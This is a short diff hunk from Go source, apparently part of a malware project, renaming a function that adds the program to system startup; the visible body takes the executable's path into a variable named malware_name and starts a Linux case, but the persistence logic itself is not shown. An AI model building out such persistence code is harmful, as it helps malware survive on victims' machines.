@@ -19,7 +19,7 @@ func System_out(msg string) {
 	fmt.Println(msg)
 }
 
-func System_add_to_startup() {
+func AddToStartup() {
 	malware_name, _ := os.Executable() // Grabs also were we currently are
 	switch runtime.GOOS {
 	case "linux":
